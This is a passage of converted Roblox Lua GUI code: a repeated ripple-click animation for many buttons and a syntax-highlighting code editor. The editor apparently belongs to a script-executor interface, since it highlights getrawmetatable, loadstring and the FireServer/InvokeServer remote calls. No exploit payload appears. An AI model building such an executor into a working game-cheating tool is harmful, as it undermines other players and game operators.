	local script = Instance.new('LocalScript', TextButton_8)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(GIXSGWU_fake_script)()
local function TNJP_fake_script() -- TextButton_9.LocalScript 
	local script = Instance.new('LocalScript', TextButton_9)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(TNJP_fake_script)()
local function JDSFLBI_fake_script() -- TextButton_10.LocalScript 
	local script = Instance.new('LocalScript', TextButton_10)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(JDSFLBI_fake_script)()
local function NGLG_fake_script() -- TextButton_11.LocalScript 
	local script = Instance.new('LocalScript', TextButton_11)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(NGLG_fake_script)()
local function HAQVUFH_fake_script() -- TextButton_12.LocalScript 
	local script = Instance.new('LocalScript', TextButton_12)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(HAQVUFH_fake_script)()
local function POAVGI_fake_script() -- TextButton_13.LocalScript 
	local script = Instance.new('LocalScript', TextButton_13)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(POAVGI_fake_script)()
local function XXMZZ_fake_script() -- TextButton_14.LocalScript 
	local script = Instance.new('LocalScript', TextButton_14)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(XXMZZ_fake_script)()
local function OQXJ_fake_script() -- TextButton_15.LocalScript 
	local script = Instance.new('LocalScript', TextButton_15)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(OQXJ_fake_script)()
local function QRAT_fake_script() -- TextButton_16.LocalScript 
	local script = Instance.new('LocalScript', TextButton_16)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(QRAT_fake_script)()
local function BPTGPET_fake_script() -- TextButton_17.LocalScript 
	local script = Instance.new('LocalScript', TextButton_17)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(BPTGPET_fake_script)()
local function PQDWWSM_fake_script() -- TextButton_18.LocalScript 
	local script = Instance.new('LocalScript', TextButton_18)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(PQDWWSM_fake_script)()
local function JDYFVA_fake_script() -- TextButton_19.LocalScript 
	local script = Instance.new('LocalScript', TextButton_19)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(JDYFVA_fake_script)()
local function LZXKORD_fake_script() -- TextButton_20.LocalScript 
	local script = Instance.new('LocalScript', TextButton_20)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(LZXKORD_fake_script)()
local function ZSLOCH_fake_script() -- TextButton_21.LocalScript 
	local script = Instance.new('LocalScript', TextButton_21)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(ZSLOCH_fake_script)()
local function IQUVL_fake_script() -- TextButton_22.LocalScript 
	local script = Instance.new('LocalScript', TextButton_22)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(IQUVL_fake_script)()
local function VWGTT_fake_script() -- TextButton_23.LocalScript 
	local script = Instance.new('LocalScript', TextButton_23)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(VWGTT_fake_script)()
local function XAEPK_fake_script() -- TextButton_24.LocalScript 
	local script = Instance.new('LocalScript', TextButton_24)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(XAEPK_fake_script)()
local function AWRBJQO_fake_script() -- Scroll.Editor 
	local script = Instance.new('LocalScript', Scroll)

	-- Super-rozbudowany edytor Lua do Roblox Studio
	-- Pełna synchronizacja linii, dynamiczne przewijanie, odporność na bugi GUI
	
	local lua_keywords = {
		"and","break","do","else","elseif","end","false","for","function","goto","if","in",
		"local","nil","not","or","repeat","return","then","true","until","while"
	}
	
	local global_env = {
		"getrawmetatable","game","workspace","script","math","string","table","print","wait","BrickColor","Color3",
		"next","pairs","ipairs","select","unpack","Instance","Vector2","Vector3","CFrame","Ray","UDim2","Enum",
		"assert","error","warn","tick","loadstring","_G","shared","getfenv","setfenv","newproxy","setmetatable",
		"getmetatable","os","debug","pcall","ypcall","xpcall","rawequal","rawset","rawget","tonumber","tostring",
		"type","typeof","_VERSION","coroutine","delay","require","spawn","LoadLibrary","settings","stats","time",
		"UserSettings","version","Axes","ColorSequence","Faces","ColorSequenceKeypoint","NumberRange","NumberSequence",
		"NumberSequenceKeypoint","gcinfo","elapsedTime","collectgarbage","PhysicalProperties","Rect","Region3",
		"Region3int16","UDim","Vector2int16","Vector3int16"
	}
	
	local Source = script.Parent:WaitForChild("Code")
	local Lines = Source.Parent:WaitForChild("Lines")
	local Scroll = script.Parent
	
	local TOKENS = {
		["="]=true,["."]=true,[","]=true,["("]=true,[")"]=true,["["]=true,["]"]=true,
		["{"]=true,["}"]=true,[":"]=true,["*"]=true,["/"]=true,["+"]=true,["-"]=true,
		["%"]=true,[";"]=true,["~"]=true,["<"]=true,[">"]=true
	}
	
	local MONOSPACE_WIDTH = 8 -- px szerokość znaku monospace dla TextSize = 14 ~ 16
	local LINE_HEIGHT = 18    -- px wysokość linii dla TextSize = 16
	local LINE_NUMBER_PAD = 12 -- dodatkowa szerokość panelu z numerami
	
	local function maskNonSpaces(str, fn)
		local out = {}
		for i=1,#str do
			local c = str:sub(i,i)
			table.insert(out, fn(c) or " ")
		end
		return table.concat(out)
	end
	
	local function Highlight(str, keywords)
		local set = {}
		for _,kw in ipairs(keywords) do set[kw] = true end
		str = str:gsub(".", function(c) return TOKENS[c] and " " or c end)
		return str:gsub("%S+", function(c) return set[c] and c or string.rep(" ", #c) end)
	end
	
	local function hTokens(str)
		return maskNonSpaces(str,function(c) return TOKENS[c] and c end)
	end
	
	local function strings(str)
		local out, i = {}, 1
		while i <= #str do
			local c = str:sub(i,i)
			if c == "\"" or c == "'" then
				local quote = c
				table.insert(out,c)
				i = i + 1
				while i <= #str and str:sub(i,i) ~= quote do
					table.insert(out,str:sub(i,i))
					i = i + 1
				end
				if i <= #str then table.insert(out,str:sub(i,i)) end
			elseif c == "[" and str:sub(i,i+1) == "[[" then
				table.insert(out,"[[")
				i = i + 2
				while i <= #str-1 and str:sub(i,i+1) ~= "]]" do
					table.insert(out,str:sub(i,i))
					i = i + 1
				end
				table.insert(out,"]]")
				i = i + 1
			else
				table.insert(out, " ")
			end
			i = i + 1
		end
		return table.concat(out)
	end
	
	local function numbers(str)
		return str:gsub("%d+", function(num) return num end)
	end
	
	local function comments(str)
		local out = {}
		local i = 1
		while i <= #str do
			if str:sub(i,i+1) == "--" then
				local j = i
				if str:sub(i+2,i+3) == "[[" then
					j = i + 4
					while j <= #str-1 and str:sub(j,j+1) ~= "]]" do j = j + 1 end
					j = j + 1
				else
					j = i + 2
					while j <= #str and str:sub(j,j) ~= "\n" do j = j + 1 end
				end
				for k=i,j do table.insert(out,str:sub(k,k)) end
				i = j
			else
				table.insert(out," ")
			end
			i = i + 1
		end
		return table.concat(out)
	end
	
	local function getLines(text)
		local lines = {}
		for line in string.gmatch(text, "([^\n]*)\n?") do
			table.insert(lines, line)
		end
		return lines
	end
	
	local function getNumLines(text)
		local lines = getLines(text or Source.Text)
		return #lines
	end
	
	local function getLongestLine(text)
		local longest = 0
		for _,line in ipairs(getLines(text or Source.Text)) do
			line = line:gsub("\t", "    ")
			local len = utf8.len(line) or #line
			if len > longest then
				longest = len
			end
		end
		return longest
	end
	
	local function getLineNumberWidth(numLines)
		-- Dynamiczna szerokość na numerki (np. 1...9999)
		local digits = math.max(2, tostring(numLines):len())
		return (digits * MONOSPACE_WIDTH) + LINE_NUMBER_PAD
	end
	
	local function highlight_source(prop)
		if prop=="Text" or prop=="CursorPosition" then
			local s = Source.Text:gsub("\13",""):gsub("\t","    ")
			Source.Keywords_.Text = Highlight(s,lua_keywords)
			Source.Globals_.Text = Highlight(s,global_env)
			Source.RemoteHighlight_.Text = Highlight(s,{"FireServer","InvokeServer"})
			Source.Tokens_.Text = hTokens(s)
			Source.Numbers_.Text = numbers(s)
			Source.Strings_.Text = strings(s)
			Source.Comments_.Text = comments(s)
	
			local linesArr = getLines(s)
			local totalLines = #linesArr
			local lineStr = ""
			for i=1,totalLines do
				lineStr = lineStr..i.."\n"
			end
			Lines.Text = lineStr
	
			-- Szerokość CanvasSize: najdłuższa linia (monospace), minimalna szerokość Scroll
			local longestLine = getLongestLine(s)
			local minWidth = Scroll.AbsoluteSize.X
			local editorWidth = math.max(longestLine * MONOSPACE_WIDTH + 40, minWidth)
			local canvasHeight = math.max(totalLines * LINE_HEIGHT + 8, Scroll.AbsoluteSize.Y)
	
			Scroll.CanvasSize = UDim2.new(0, editorWidth, 0, canvasHeight)
	
			-- Panel z numerami: dynamiczna szerokość, wysokość = CanvasSize
			Lines.Size = UDim2.new(0, getLineNumberWidth(totalLines), 0, canvasHeight)
			Lines.Position = UDim2.new(0, 0, 0, 0)
			Lines.BackgroundTransparency = 1 -- przezroczyste tło
	
			-- Synchronizacja appearance
			Lines.Font = Source.Font
			Lines.TextSize = Source.TextSize
			Lines.TextColor3 = Color3.fromRGB(180,180,180)
		end
	end
	
	local function move_lines()
		Lines.Position = UDim2.new(0, 0, 0, -Scroll.CanvasPosition.Y)
	end
	
	local function sync_lines_appearance()
		Lines.Font = Source.Font
		Lines.TextSize = Source.TextSize
		Lines.TextColor3 = Color3.fromRGB(180,180,180)
		Lines.BackgroundTransparency = 1
	end
	
	-- Synchronizacje
	Source.Changed:Connect(highlight_source)
	Source:GetPropertyChangedSignal("Font"):Connect(sync_lines_appearance)
	Source:GetPropertyChangedSignal("TextSize"):Connect(sync_lines_appearance)
	Source:GetPropertyChangedSignal("Size"):Connect(highlight_source)
	Scroll:GetPropertyChangedSignal("CanvasPosition"):Connect(move_lines)
	
	-- Inicjalizacja
	highlight_source("Text")
	sync_lines_appearance()
	move_lines()
	
	-- Zabezpieczenie przed bugami (np. Source.Text = nil)
	Source:GetPropertyChangedSignal("Text"):Connect(function()
		if not Source.Text then Source.Text = "" end
	end)
	
	Lines.ClearTextOnFocus = false
	Lines.TextEditable = false
	
	-- Fajne rozszerzenie: auto-scroll przy dodaniu nowej linii na końcu
	Source:GetPropertyChangedSignal("Text"):Connect(function()
		local totalLines = getNumLines(Source.Text)
		local scrollY = Scroll.CanvasSize.Y.Offset - Scroll.AbsoluteSize.Y
		if Source.CursorPosition == #Source.Text + 1 and totalLines > 1 then
			Scroll.CanvasPosition = Vector2.new(Scroll.CanvasPosition.X, scrollY)
		end
	end)
	
	-- Obsługa bardzo dużych plików: limituj do 5000 linii (możesz zwiększyć ten limit)
	Source:GetPropertyChangedSignal("Text"):Connect(function()
		if getNumLines(Source.Text) > 5000 then
			Source.Text = Source.Text:match(("([^\n]*\n?)"):rep(5000))
		end
	end)
end
coroutine.wrap(AWRBJQO_fake_script)()
